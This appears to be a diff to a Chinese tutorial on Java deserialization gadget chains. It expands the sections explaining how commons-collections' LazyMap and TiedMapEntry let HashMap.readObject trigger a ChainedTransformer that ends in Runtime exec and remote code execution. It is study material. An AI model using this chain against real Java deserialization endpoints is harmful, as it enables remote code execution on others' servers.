@@ -109,12 +109,49 @@ chain.transform(null);   // 依次执行 1→2→3→4 → Runtime.getRuntime().
 
 ## 六、谁来触发 transform：LazyMap
 
-`LazyMap.get(key)` 有一个特性：**如果 map 里没有这个 key，就用 `factory.transform(key)` 生成值并放进去**（惰性加载，本来是给"延迟初始化"场景设计的）。
+### 6.1 LazyMap 的"懒加载"特性
+
+`LazyMap`（`org.apache.commons.collections.map.LazyMap`，commons-collections 3.x）是一个**装饰器**：它包住一个普通 Map，并带一个 `factory`。它对不存在的 key 不返回 `null`，而是**用 `factory.transform(key)` 现算一个值并缓存**——设计本意是"延迟初始化"（值比较贵、用到才生成）：
 
 ```java
-Map lazyMap = LazyMap.decorate(new HashMap(), chain);   // factory = chain
-lazyMap.get("任何不存在的key");   // → chain.transform("...") → RCE！
+// LazyMap 继承 AbstractMapDecorator，被装饰的 map 存在父类的 map 字段里，所以用 super.map 访问
+public Object get(Object key) {
+    if (!super.map.containsKey(key)) {                 // ① 内层 map 里没有这个 key
+        Object value = this.factory.transform(key);    // ② 用 factory 现算一个值
+        super.map.put(key, value);                     // ③ 算完存进缓存
+        return value;
+    } else {                                           // ④ 有 key 就直接返回缓存值
+        return super.map.get(key);
+    }
+}
 ```
+
+### 6.2 `LazyMap.decorate(new HashMap(), chain)` 做了什么
+
+`decorate` 是 `LazyMap` 的**静态工厂方法**（构造器是 protected，只能走它）：
+
+```java
+public static Map decorate(Map map, Transformer factory) {
+    return new LazyMap(map, factory);
+}
+```
+
+所以 `LazyMap.decorate(new HashMap(), chain)` = `new LazyMap(空 HashMap, chain)`，LazyMap 内部只存两样东西：
+
+- **`map`**：传入的空 `HashMap`（被装饰的内层容器）；
+- **`factory`**：`chain`（那个 `ChainedTransformer`）。
+
+于是"对空 map 调 `get(任意不存在的 key)`"就被改写成"执行整条 transformer 链"：
+
+```java
+Map lazyMap = LazyMap.decorate(new HashMap(), chain);   // map=空HashMap, factory=chain
+lazyMap.get("任何不存在的key");
+// → containsKey == false → factory.transform("key")
+// → chain.transform("key") → getMethod → invoke → exec → RCE！
+```
+
+> **关键**：`LazyMap` 把"一次无害的 `map.get(缺的 key)`"变成"调用任意 `factory.transform`"，而 `factory` 是攻击者可控的 `Transformer`——这就是把"集合操作"改写成"执行链"的转换器。
+
 现在链条推进到：`LazyMap.get(key) → factory.transform(key) → ... → exec`。
 
 ![image-20260810093653867](/images/2026-07-24-Java反序列化Gadget链入门.assets/image-20260810093653867.png)
@@ -125,21 +162,54 @@ lazyMap.get("任何不存在的key");   // → chain.transform("...") → RCE！
 
 还差最后一步：反序列化时，谁会调用 `LazyMap.get()`？
 
-`TiedMapEntry` 是"绑定了一个 map 和 key"的条目，它的 `hashCode()` 内部会调用 `map.get(key)`：
+### 7.1 TiedMapEntry：hashCode 是入口
+
+`TiedMapEntry` 是"绑定了一个 map 和 key"的条目，它实现 `Map.Entry`。它的 `hashCode()` **第一行就调用了 `getValue()`——钩子就在这里**：
+
+```java
+public int hashCode() {
+    Object value = this.getValue();   // ← 第一行就调 getValue()
+    return (this.getKey() == null ? 0 : this.getKey().hashCode())
+           ^ (value == null ? 0 : value.hashCode());
+}
+```
+
+而 `getValue()` 内部就是 `map.get(key)`：
+
+```java
+public Object getValue() {
+    return map.get(key);   // ← 关键：调用了 LazyMap.get()
+}
+```
+
+> 后半段的 `key.hashCode() ^ value.hashCode()` 只是让对象有一个合理的哈希值、方便被放进 HashMap，**与攻击无关**。真正的触发点在第一行的 `getValue()`。
+
+### 7.2 HashMap.readObject：反序列化时自动调 hashCode
+
+`HashMap.readObject()` 重建条目时会对每个 key 调 `hashCode()`（见第二节）：
+
+```java
+// HashMap.readObject 内部（简化）
+for (int i = 0; i < mappings; i++) {
+    K key = (K) s.readObject();
+    putVal(hash(key), key, value, false, false);   // hash(key) 会调 key.hashCode()
+}
+```
+
+所以让 `HashMap` 的 key 是那个 `TiedMapEntry`，反序列化就自动触发整条链：
 
 ```java
 TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
-entry.hashCode();   // → lazyMap.get("key") → chain.transform → RCE
+// 反序列化时：HashMap.readObject → key.hashCode() → getValue() → lazyMap.get("key") → chain.transform → RCE
 ```
-而 `HashMap.readObject()` 会对每个 key 调 `hashCode()`（见第二节）：
 
-```java
-    public int hashCode() {
-        Object value = this.getValue();
-        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
-    }
 ```
-所以让 `HashMap` 的 key 是那个 `TiedMapEntry`，反序列化就自动触发整条链。
+HashMap.readObject()
+  → hash(key) → key.hashCode()        ← key = TiedMapEntry
+  → TiedMapEntry.hashCode()
+  → getValue() → LazyMap.get(key)     ← 命中 6.2 的 factory.transform
+  → chain.transform() → RCE
+```
 
 ---
 
